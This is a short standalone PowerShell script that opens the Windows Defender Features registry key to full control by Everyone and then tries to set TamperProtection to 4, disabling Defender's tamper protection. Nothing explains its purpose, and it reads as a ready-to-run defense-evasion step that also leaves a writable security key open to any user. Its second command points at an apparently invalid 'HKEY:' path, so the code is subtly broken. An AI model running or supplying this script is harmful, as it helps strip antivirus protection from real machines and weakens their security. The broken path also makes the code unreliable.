$regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
 
Try  {
        Get-ItemProperty $regPath -ErrorAction Stop        
        $regACL = Get-ACL $regPath
        $regRule= New-Object System.Security.AccessControl.RegistryAccessRule("Everyone","FullControl","Allow")
        $regACL.SetAccessRule($regRule)
        Set-Acl $regPath $regACL
        Set-ItemProperty -Path "HKEY:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value "4" -Force
        Write-Host "Success!"
      }
 
Catch {
             
         Write-Host "Failed!"
      }
